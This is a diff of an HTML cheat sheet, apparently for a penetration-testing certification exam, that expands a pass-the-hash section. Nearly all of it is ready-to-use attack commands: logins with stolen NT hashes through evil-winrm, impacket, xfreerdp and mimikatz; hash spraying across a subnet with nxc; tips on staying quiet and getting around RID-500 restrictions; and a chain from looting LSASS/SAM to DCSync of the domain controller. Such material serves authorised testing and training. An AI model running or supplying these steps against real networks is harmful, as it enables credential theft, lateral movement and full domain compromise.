@@ -216,7 +216,23 @@ Set <b>&lt;KALI&gt;</b> = your tun0 IP. Full detail: <b>exam-harness/USAGE.md</b
 <span class=cmd>./scripts/ad-secretsdump.sh -t &lt;DC&gt; -d corp.local -u da -H &lt;nthash&gt;<span class=c>  # DCSync</span></span>
 <span class=cmd>./scripts/bloodhound.sh start<span class=c>   # UI :8080 ; drag .zip ; shortest path to DA</span></span>
 </pre>
-<p class=note>Move: <code>evil-winrm -i IP -u u -p p</code> | <code>-H &lt;hash&gt;</code> (PtH) | <code>impacket-psexec corp/u:p@IP</code></p>
+<p class=note><b>Pass-the-Hash</b> — the NT hash IS the password; pass <code>-H &lt;NThash&gt;</code> anywhere you'd type one. Tool depends on the OPEN port:</p>
+<table class=ttbl>
+<tr><th>Port</th><th>Tool (PtH) — try WinRM → wmiexec → psexec</th></tr>
+<tr><td>5985 WinRM</td><td><code>evil-winrm -i IP -u Administrator -H &lt;hash&gt;</code> — cleanest, interactive PS</td></tr>
+<tr><td>445 SMB</td><td><code>impacket-wmiexec -hashes :&lt;hash&gt; Administrator@IP</code> — quiet · <code>impacket-psexec</code> → SYSTEM but loud</td></tr>
+<tr><td>3389 RDP</td><td><code>xfreerdp /u:Administrator /pth:&lt;hash&gt; /v:IP</code> — GUI (Restricted Admin)</td></tr>
+<tr><td>135 DCOM</td><td><code>impacket-dcomexec</code> — fallback</td></tr>
+</table>
+<p class=note><b>Spray the hash</b> (one local-admin hash often unlocks many boxes — <code>(Pwn3d!)</code> = admin there):</p>
+<pre>
+<span class=cmd>nxc smb 172.16.0.0/24 -u Administrator -H &lt;hash&gt; --local-auth<span class=c>  # local admin spray</span></span>
+<span class=cmd>nxc smb 172.16.0.0/24 -u jdoe -H &lt;hash&gt; -d corp.local<span class=c>         # domain acct</span></span>
+<span class="cmd nop c"># on-host, become another user in place:</span>
+<span class="cmd nop c">mimikatz: sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:&lt;hash&gt; /run:powershell</span>
+</pre>
+<p class=note><b>Gotchas:</b> use the <b>RID-500</b> Administrator hash — non-500 local admins are PtH-blocked unless <code>LocalAccountTokenFilterPolicy=1</code>. Local hash → <code>--local-auth</code>; domain → <code>-d</code>. Pass NT only: <code>-H &lt;32hex&gt;</code> / <code>-hashes :&lt;32hex&gt;</code>. Always grab SYSTEM hive with SAM/ntds.</p>
+<p class=note><b>Cascade:</b> loot hash → nxc spray → own (Pwn3d!) hosts → loot their LSASS/SAM → repeat → DA hash → DCSync the DC.</p>
 </div></section>
 
 <section><div class=head><span class=num>6</span><h2>Capture proof</h2><span class=tag>the moment you flag</span></div>
